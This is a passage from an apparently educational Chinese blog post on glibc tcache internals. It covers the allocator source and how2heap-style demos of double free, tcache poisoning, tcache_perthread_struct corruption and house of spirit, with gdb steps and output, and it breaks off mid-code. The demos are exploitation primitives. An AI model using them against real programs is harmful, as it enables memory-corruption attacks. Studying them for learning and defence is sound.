*/</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_init()</code> 成功返回后，<code>tcache_perthread_struct</code> 就被成功建立了。</p>
<h4 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h4><p>接下来将进入申请内存的步骤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// 由 size 计算的 idx 在合法范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 该条 tcache 链不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 进入与无 tcache 时类似的流程</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</p>
<h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>看一下 <code>tcache_get()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</p>
<h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free()"></a>__libc_free()</h4><p>看完申请，再看看有 tcache 时的释放</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</p>
<h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free()"></a>_int_free()</h4><p>跟进 <code>_int_free()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是<strong>要释放的 chunk</strong> 和<strong>该 chunk 对应的 size 在 tcache 中的下标</strong>。</p>
<h4 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</p>
<h3 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h3><p>上面的应该是glibc2.27的源码，来自ctf-wiki</p>
<p>首先，来理解一下新增的两个结构体<code>tcache_entry</code>和<code>tcache_perthread_struct</code>。</p>
<h4 id="tcache-entry-1"><a href="#tcache-entry-1" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>这里的<code>t</code>是 thread即线程，<code>cache</code> 是缓存，<code>entry</code>是条目，所以顾名思义 tcache_entry 就是线程缓存的条目。</p>
<p>条目是什么意思呢？如下：</p>
<ol>
<li><p><strong>文献和书籍</strong>：在字典、百科全书、参考书籍等中，“条目”指的是对某一特定词汇、概念或主题的解释或描述。例如，字典中的每一个词汇及其定义都可以称为一个条目。</p>
</li>
<li><p><strong>清单和目录</strong>：在清单或目录中，“条目”指的是其中的各个项目或元素，比如商品清单中的每一项商品都可以被称为一个条目。</p>
</li>
<li><p><strong>数据库</strong>：在数据库管理中，一个“条目”指的是数据库中的一条记录，通常包含多个字段的信息。</p>
</li>
</ol>
<p>总之，“条目”强调的是在某个系统或结构中被标识和记录的一个单位，通常与其他条目一起形成一个完整的集合。</p>
<hr>
<p><img data-src="/../images/image-20250320214550152.png" alt="image-20250320214550152"></p>
<p>这个tcache_entry就应该是像上面这样的单链表结构，</p>
<h4 id="tcache-perthread-struct-1"><a href="#tcache-perthread-struct-1" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><p>这个的意思就是 每个线程的线程缓存的结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个线程都有一个这样的结构体，它包含了每个线程的缓存（因此称为“tcache_perthread_struct”）。</p>
<p>Glibc在2.26中加入了tcache，它对每个线程增加一个bin缓存，这样能显著提高性能，默认情况下，<strong>每个线程有64个bins，以16(8)递增，msize从24(12)到1032(516)</strong>。</p>
<ul>
<li><code>char counts[TCACHE_MAX_BINS];</code><ul>
<li><code>counts</code> 数组用于跟踪每个 bins 中已分配块的数量。每个索引对应于一个特定大小的内存块。</li>
</ul>
</li>
<li><code>tcache_entry *entries[TCACHE_MAX_BINS];</code><ul>
<li><code>entries</code> 数组用于存储指向 chunk 的指针。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>TCACHE_MAX_BINS</code> 被定义为 64，表示缓存可以有最多 64 个bins。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__thread</code> 关键字用于声明 <code>tcache</code> 为线程局部存储变量，这意味着每个线程都有自己独立的 <code>tcache</code> 实例。</li>
<li><code>tcache</code> 初始化为 <code>NULL</code>，表示还没有为其分配内存或没有初始化。</li>
</ul>
<h4 id="tcache-init-1"><a href="#tcache-init-1" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>在这个函数中注意到这两行代码<code>const size_t bytes = sizeof (tcache_perthread_struct); victim = _int_malloc (ar_ptr, bytes);</code></p>
<p>在第一次调用 malloc() 时，系统分配 heap 区域后分配了一个大小为<code>sizeof(tcache_perthread_struct) = 0x241(583)</code>的chunk，它就是每个线程中用于 tcache 机制的一块内存空间。</p>
<h4 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>在<code>__libc_malloc()</code>开头被调用，这个就是用于从 tcache 中获取一个被 free 的 chunk。</p>
<h4 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><p>在<code>_int_free()</code>中被调用，这个用于将一个内存块放回tcache中。</p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><h5 id="什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？"><a href="#什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？" class="headerlink" title="什么情况下会调用 tcache_get 函数数值（什么情况下会到 tcache 中查找 chunk）？"></a>什么情况下会调用 <code>tcache_get</code> 函数数值（什么情况下会到 tcache 中查找 chunk）？</h5><ol>
<li>在调用 <code>malloc_hook</code> 之前，<code>int_malloc</code> 之前，如果 <code>tcache</code> 中有合适的 chunk，那么就从 <code>tcache</code> 中取出：</li>
<li>通过 <code>unsorted bin</code>，若 <code>tcache bin</code> 有对应大小的 chunk，从 <code>tcache</code> 中取出：</li>
<li>通过 <code>unsorted bin</code> 时，如果大小不匹配，<code>chunk</code> 会被放入对应的 <code>bins</code>，若达到 <code>tcache_unsorted_limit</code> 限制之前已经存入 <code>chunk</code> 就此被取出（默认限制）。</li>
</ol>
<p>在内存分配的 <code>malloc</code> 函数中，会将内存块移入 <code>tcache</code> 中。</p>
<h5 id="tcache-的功能"><a href="#tcache-的功能" class="headerlink" title="tcache 的功能"></a>tcache 的功能</h5><ol>
<li>首先，申请的内存块符合 <code>fastbin</code> 大小并且在 <code>fastbin</code> 内找到可用的空闲块时，会把 <code>fastbin</code> 链表的其他内存块放入 <code>tcache</code> 中。</li>
<li>其次，申请的内存块符合 <code>smallbin</code> 大小并且在 <code>smallbin</code> 内找到可用的空闲块时，会把 <code>smallbin</code> 链上的其他内存块放入 <code>tcache</code> 中。</li>
<li>第三，针对 <code>unsorted bin</code> 链上有合适的链块时，并不直接返回，而是先放到 <code>tcache</code> 中，继续处理。上面的情况将 <code>chunk</code> 放入 <code>tcache</code> 中，在将合适的 <code>chunk</code> 返回时利用。</li>
</ol>
<p>在 <code>tcache_get</code> 中，<strong>仅仅检查了 <code>tck_idx</code></strong>，前面说过，可以将 <code>tcache</code> 当作一个类似于 <code>fastbin</code> 的单独链表，只是它的 <code>check</code> 并没有复用，因此我们可以利用这一点来进行 <code>attack</code>。</p>
<p> <strong>tcache 遵循“后进先出”，从头部插入，尾部取出</strong></p>
<h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>通过下面这段程序再来理解一下tcache，环境：ubuntu 18.04</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o struct struct.c -g</span></span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li>运行到 malloc(0) 直接一直 si 中间的call注意一下 n 跳过。</li>
<li>一直到如下所示 si 进入</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78b66 &lt;malloc_hook_ini+374&gt;    call   tcache_init.part                &lt;tcache_init.part&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>在一直si到</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78460 &lt;tcache_init.part+80&gt;     call   _int_malloc                &lt;_int_malloc&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>用 n 到下一步，再用 heap 就可以看到系统分配了 heap 和这个 tcache_perthread_struct 的 chunk。</li>
</ul>
<img data-src="../images/image-20250320221542108.png" alt="image-20250320221542108" style="zoom: 50%;" />

<h3 id="glibc-tcache变化"><a href="#glibc-tcache变化" class="headerlink" title="glibc_tcache变化"></a>glibc_tcache变化</h3><ul>
<li>glibc2.26中引入tcache</li>
<li>glibc2.27中正式应用了tcache</li>
<li>glibc2.29中加入了检查tcache的double_free的机制，tcache_get()中加入了key变量</li>
</ul>
<h2 id="攻击原理demo"><a href="#攻击原理demo" class="headerlink" title="攻击原理demo"></a>攻击原理demo</h2><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h3><p>本demo是一个简单的利用tcache的double-free attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我们知道在Fastbin attack的时候我们是不能依次free两次同一块chunk的，但是tcache可以</p>
<p>这是为什么呢？原因也很简单，从tcache_put函数可以看出，它几乎没有设置任何检查，也就意味着我们无需做任何事就可以对同一个chunk进行多次的free，相比fastbin_dup来说，tcache_dup的利用更加的简单了</p>
<p>然后我们再malloc两次就可以得到同一块内存的chunk</p>
<p>对本程序而言，程序先malloc了一个chunk a(size&#x3D;8)</p>
<p>然后连续Free两次chunk a,此时在free list中就会链入两次chunk a,</p>
<p>这个时候我们再申请两次chunk就可以将两次的chunk a全部拿出来了</p>
<h3 id="tcache-corruption"><a href="#tcache-corruption" class="headerlink" title="tcache_corruption"></a>tcache_corruption</h3><p>这段代码演示了控制tcache_perthread_struct的chunk，修改next指针（目前的tcache并没有检查next指向的chunk的size是否合法，所以直接伪造next指针为想要修改的地址就好了）实现任意地址写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> st   ruct tcache_entry &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> global_buf[<span class="number">0x100</span>] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *ptr, *controlled_buf;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> temp;</span><br><span class="line">    tcache_perthread_struct *fake;</span><br><span class="line"><span class="comment">//申请一个 chunk 为泄露 tcache_perthread_struct 的 chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    temp = (<span class="type">long</span> <span class="type">long</span>)ptr;</span><br><span class="line"><span class="comment">//计算出 tcache_perthread_struct 的 chunk_mem_ptr, 首先要能泄露一个堆地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line">    temp = temp &amp; (~<span class="number">0xfff</span>);</span><br><span class="line">    temp += <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//向 tcache_perthread_struct 的 chunk 中写入一个地址，他就会出现在 tcache 中，将其申请出来就得到了一个可写的chunk</span></span><br><span class="line">    fake = (tcache_perthread_struct *)temp;</span><br><span class="line">    fake-&gt;entries[<span class="number">5</span>] = (tcache_entry *)global_buf;</span><br><span class="line"><span class="comment">//申请出那块可写的 chunk(内存)，进行写入</span></span><br><span class="line">    controlled_buf = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(controlled_buf, <span class="string">&quot;Tcache Corruption&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li><code>b 25</code>，查看 ptr </li>
<li><code>b 30</code>，查看temp，它是 tcache_perthread_struct 的 chunk_mem_ptr</li>
<li><code>b 33</code>，在这行代码处查看 global_buf 的内容，此时为 hello world</li>
<li><code>b 37</code>，再次查看 global_buf 的内容</li>
</ul>
<p>运行结果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ctf@1a3f037ee8c1:~/pwn$ ./demo</span><br><span class="line">global_buf: hello world</span><br><span class="line">temp: 555555602670</span><br><span class="line">temp: 555555602010</span><br><span class="line">global_buf: Tcache Corruption</span><br></pre></td></tr></table></figure>

<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><p>来源：how2heap</p>
<p>此demo的效果就是返回一个指向任意地址的指针，与fastbin corruption攻击极其相似（本例返回的地址是一个栈地址）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="comment">//我们想要返回的地址是stack_var</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;定义了一个变量 stack_var，我们想让程序 malloc 到这里 %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;接下来申请两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk a 在: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk b 在: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free 掉这两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 那个链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="comment">//我们通过覆写第一个chunk的fd指针，使其指向我们的栈地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们把 %p 的前 %lu 字节（也就是 fd/next 指针）改成 stack_var 的地址：%p&quot;</span>, b, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;然后一次 malloc : %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第二次 malloc: %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>b 17</code>，此时申请了两个chunk，一个应该是为了防止合并到Top_chunk，另一个是要攻击的chunk，也就是b。</li>
<li><code>b 22</code>，此时两个chunk已经进入到tcache中。</li>
<li><code>b 27</code>，这里修改了b[0]的位置，也就是chunk b的next指针，此时bins中应为：<code>b -&gt; &amp;stack_var</code></li>
<li><code>b 30</code>，这里申请了一个chunk，此时bins中应为：<code>&amp;stack_var</code></li>
<li><code>b 33</code>，这里很明显就是申请出了&amp;stack_var作为chunk</li>
</ul>
<blockquote>
<p>原因：在glibc 2.27中没有像fastbin中那样检查free_chunk的size域</p>
</blockquote>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>对于tcache poisoning来说，我们的利用极其简单</p>
<p>只需要free掉一个chunk放入tcache中，然后直接更改其fd指针，我们就可以任意地址malloc了</p>
<p>程序首先在栈上声明了一个变量，之后malloc了chunk a(size&#x3D;128),此时free掉chunk a,a被链入到free list中</p>
<p>然后程序覆写了a的fd指针，将其指向了我们的栈指针</p>
<p>现在栈指针也被链入了我们的free list中</p>
<p>此时我们再malloc，因为不会检查size是否合法，就可以直接将我们的栈指针取出来了(先进后出</p>
<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><p>tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 在 %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 改成 0x40 \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;把 fake_chunks[2] 的地址赋给 a, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free 掉 a\n&quot;</span>);</span><br><span class="line">    <span 